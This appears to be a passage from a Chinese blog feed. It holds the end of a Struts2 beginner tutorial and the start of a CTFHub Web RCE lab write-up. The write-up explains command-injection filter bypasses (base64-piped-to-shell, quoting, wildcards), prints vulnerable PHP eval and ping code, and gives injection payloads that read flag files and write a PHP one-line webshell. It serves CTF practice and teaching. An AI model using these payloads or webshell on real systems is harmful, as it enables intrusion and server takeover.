href="#第四步：创建Action类" class="headerlink" title="第四步：创建Action类"></a>第四步：创建Action类</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="第五步：创建struts-xml文件"><a href="#第五步：创建struts-xml文件" class="headerlink" title="第五步：创建struts.xml文件"></a>第五步：创建struts.xml文件</h3><p>引入dtd约束，该代码可以在WebContent\WEB-INF\lib\struts2-core-2.3.37.jar找到<br><img src="https://img-blog.csdnimg.cn/20210319195632426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 配置Action --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;helloWorld&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 配置result结果页面跳转 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">       <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;helloWorld&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>解决Struts2的配置文件struts.xml文件无提示问题</strong><br>struts.xml文件提示来自DTD约束：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方法1：电脑可以上网，会自动访问<code>http://struts.apache.org/dtds/struts-2.3.dtd</code>，提供提示功能<br>方法2: 配置本地DTD提示<br>首先需要找到我们的struts核心jar包<code>struts2-core-2.3.30.jar</code>，然后我们需要将它解压，可以看到<code>struts-2.3.dtd</code>文件<br><img src="https://img-blog.csdnimg.cn/2021032319251158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择window  –&gt; preferences  –&gt;  搜索xml  –&gt;  选择xml Catalog<br><img src="https://img-blog.csdnimg.cn/20210323192626738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>  Location：点击File System，添加刚才解压ruts2-2.3.dtd文件路径。</li><li>   Key type ：选择URI</li><li>  key：<a href="http://struts.apache.org/dtds/struts-2.3.dtd">http://struts.apache.org/dtds/struts-2.3.dtd</a><br><img src="https://img-blog.csdnimg.cn/20210323192722238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击应用，重新打开struts.xml编辑，会得到提示<br><img src="https://img-blog.csdnimg.cn/20210323193147877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="第六步：创建jsp文件"><a href="#第六步：创建jsp文件" class="headerlink" title="第六步：创建jsp文件"></a>第六步：创建jsp文件</h3><p>index.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Struts2入门案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Struts2入门案例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;$&#123;pageContext.request.contextPath &#125;/helloWorld.action&quot;</span>&gt;</span>Click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Struts2跳转页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Struts2跳转页面成功<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第七步：部署项目"><a href="#第七步：部署项目" class="headerlink" title="第七步：部署项目"></a>第七步：部署项目</h3><p>发布项目，点击超链接<br><img src="https://img-blog.csdnimg.cn/20210319201030489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跳转成功<br><img src="https://img-blog.csdnimg.cn/20210319201255433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Struts2处理流程"><a href="#Struts2处理流程" class="headerlink" title="Struts2处理流程"></a>Struts2处理流程</h2><p>（1）用户在客户端发出HTTP请求</p><p>（2）然后请求被核心过滤器StrutsPrepareAndExecuteFilter拦截</p><p>（3）核心过滤器将请求转发到Action映射器，Action映射器负责识别当前的请求是否需要交由Struts2处理。</p><p>（4）Action映射器返回需要struts2处理的信息，StrutsPrepareAndExecuteFilter会创建一个Action代理</p><p>（5）Action代理并不知道执行哪一个Action，它会向配置管理器询问调用哪一个Action，配置管理器会从struts.xml读取我们配置的Action信息。</p><p>（6）Action代理创建相关请求的Action对象，调用相关的方法之前，struts2的一系列拦截器会帮我们做一些操作，例如获取请求参数等。</p><p>（7）然后调用execute方法根据返回的字符串去匹配相应的页面，</p><p>（8）页面可以获取一些页面模板，然后生成最终页面，再倒序的执行拦截器的后续操作</p><p>（9）最后生成HTTP响应内容</p><p><img src="https://img-blog.csdnimg.cn/20210319201448283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（一）&lt;/p&gt;</summary>
    
    
    
    <category term="SSH" scheme="https://swhat.github.io/categories/SSH/"/>
    
    
    <category term="Struts2" scheme="https://swhat.github.io/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-RCE练习</title>
    <link href="https://swhat.github.io/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</id>
    <published>2021-01-16T08:12:47.000Z</published>
    <updated>2021-04-04T14:01:52.304Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（四）</p> <a id="more"></a><h1 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h1><p>RCE英文全称：remote command/code execute<br>分为远程命令执行和远程代码执行<br>|              |                            |      |<br>| ———— | ————————– | —- |<br>| 远程命令执行 | 直接调用操作系统命令       | ping |<br>| 远程代码执行 | 靠执行代码调用操作系统命令 | eval |</p><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h2 id="Windows管道符"><a href="#Windows管道符" class="headerlink" title="Windows管道符"></a>Windows管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h2 id="Linux的管道符"><a href="#Linux的管道符" class="headerlink" title="Linux的管道符"></a>Linux的管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td><code>;</code></td><td>执行完前面的语句再执行后面的语句。</td></tr><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>　1.拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a<span class="variable">$b</span> $c<span class="variable">$d</span></span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>　2.编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash</span><br></pre></td></tr></table></figure><p>　3.单引号，双引号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="string">&#x27;&#x27;</span>t flag</span><br><span class="line">ca<span class="string">&quot;&quot;</span>t flag</span><br></pre></td></tr></table></figure><p>　4.反斜杠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><p>   5.Shell 特殊变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca<span class="variable">$@t</span> flag</span><br><span class="line">ca<span class="variable">$1t</span> flag</span><br></pre></td></tr></table></figure><p>   6.通配符绕过</p><p>常用的通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment">#匹配任意长度字符</span></span><br><span class="line">? <span class="comment">#匹配任意单个字符</span></span><br><span class="line">[list] <span class="comment">#匹配指定范围(list)内的任意字符，也可以是单个字符组成的集合</span></span><br><span class="line">[^list] <span class="comment">#匹配指定范围外的任意单个字符或字符集合</span></span><br><span class="line">[!list]  <span class="comment">#[^list]</span></span><br><span class="line">&#123;str1,str2&#125;<span class="comment">#匹配str1或者str2</span></span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>fl*</span><br><span class="line">cat fl[a-z]?</span><br><span class="line">cat fla* </span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>fl*</span><br></pre></td></tr></table></figure><h1 id="相关命令执行变量"><a href="#相关命令执行变量" class="headerlink" title="相关命令执行变量"></a>相关命令执行变量</h1><p>PHP代码执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>函数、</span><br><span class="line">preg_replace、</span><br><span class="line">create_function函数、</span><br><span class="line">array_map、</span><br><span class="line">call_user_func、</span><br><span class="line">assert、</span><br><span class="line">call_user_func_array、</span><br><span class="line">array_filter、</span><br><span class="line">uasor </span><br></pre></td></tr></table></figure><p>PHP代码命令执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">popen、</span><br><span class="line">proc_popen、</span><br><span class="line">passthru、</span><br><span class="line">system变量、</span><br><span class="line"><span class="built_in">exec</span>变量、</span><br><span class="line">shell_exec、</span><br><span class="line">pcntl_exec。</span><br></pre></td></tr></table></figure><h1 id="CTFHub-Web-RCE练习"><a href="#CTFHub-Web-RCE练习" class="headerlink" title="CTFHub-Web-RCE练习"></a>CTFHub-Web-RCE练习</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看根目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?cmd=system(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201208153824782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看下一级目录,发现flag_23816文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?cmd=system(<span class="string">&quot;ls /&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020120918423712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用cat命令读取文件,找到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?cmd=system(<span class="string">&quot;cat /flag_23816&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201209184311919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//blog.csdn.net/Xxy605/article/details/107548841?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control</span></span><br></pre></td></tr></table></figure><h2 id="命令注入-无过滤"><a href="#命令注入-无过滤" class="headerlink" title="命令注入-无过滤"></a>命令注入-无过滤</h2><p>这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$_GET</span>[&#x27;ip&#x27;]&#125;&quot;</span>;</span><br><span class="line">    <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ping一下127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20201210184652619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: ?ip=|ls</span><br></pre></td></tr></table></figure><p>发现了25900911724350.php<br><img src="https://img-blog.csdnimg.cn/20201211103127797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用cat读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|cat <span class="number">25900911724350.</span>php</span><br></pre></td></tr></table></figure><p>无回显，可能存在字符编码无法显示出来<br><img src="https://img-blog.csdnimg.cn/20201210184802952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看网页源代码<br><img src="https://img-blog.csdnimg.cn/20201211103237831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以利用管道符，通过base64的形式显示文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=|cat <span class="number">25900911724350.</span>php|base64</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201211103751285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201210185039373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还可以写码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;<span class="keyword">echo</span> -e <span class="string">&quot;&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; a.php </span><br></pre></td></tr></table></figure><p>执行<code>?ip=;ls</code>，发现写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104044953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>蚁剑连接，数据返回为空<br><img src="https://img-blog.csdnimg.cn/20201211104308449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要注意echo命令会调用<code>$_POST</code>导致原始文件中没有,一句话木马里面 <code>$_POST</code> 前加上  <code>\</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=;<span class="keyword">echo</span> -e <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; b.php </span><br></pre></td></tr></table></figure><p>b.php写入成功<br><img 